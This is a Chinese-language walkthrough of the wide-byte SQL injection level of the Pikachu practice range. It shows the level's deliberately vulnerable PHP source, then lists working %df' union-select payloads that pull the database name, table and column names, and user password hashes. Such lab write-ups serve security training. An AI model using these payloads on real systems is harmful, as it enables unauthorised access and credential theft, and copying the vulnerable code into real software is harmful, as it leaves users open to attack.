# wide byte注入

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_widebyte.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";


$link=connect();

$html='';

if(isset($_POST['submit']) && $_POST['name']!=null){

    $name = escape($link,$_POST['name']);
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题
    $set = "set character_set_client=gbk";
    execute($link,$set);

    //mysqi_query不打印错误描述
    $result=mysqli_query($link, $query);
    if(mysqli_num_rows($result) >= 1){
        while ($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }


}



?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../sqli.php">sqli</a>
                </li>
                <li class="active">wide byte注入</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="kobe/123456,先搜索下什么是宽字节注入搞懂了在来测试吧">
                点一下提示~
            </a>


        </div>
        <div class="page-content">
            <div id="sqli_main">
                <p class="sqli_title">what's your username?</p>
                <form method="post">
                    <input class="sqli_in" type="text" name="name" />
                    <input class="sqli_submit" type="submit" name="submit" value="查询" />
                </form>
                <?php echo $html;?>
            </div>





        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察源码可以得到的该关卡对用户输入做了转义时，如将'转义成\'时，这使得'无法进行闭合数据库中的语句

***

# 二、通关教程

测试注入

```
name=1%df' or 1=1#
name=1%df' order by 2#		# 正常
name=1%df' order by 3#		# 异常

// 该页面存在宽字节注入，且闭合符号为' ，字段数为2
```

![image-20230307150757165](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230307150757165.png)

猜数据库名

```
name=1%df' union select database(),2#
//得到数据库名为pikachu
```

![image-20230307150838242](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230307150838242.png)

猜表名

```
name=1%df' union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2#
//修改limit得到表名 httpinfo,member,message,users,xssblind 
```

猜字段

```
name=1%df' union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2#
//修改limit得到users表下字段有 id,username,password,level 
```

猜内容

```
name=1%df' union select (select group_concat(username) from users),(select group_concat(password) from users)#
// admin,pikachu,test
// e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03
```

![image-20230307151056995](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230307151056995.png)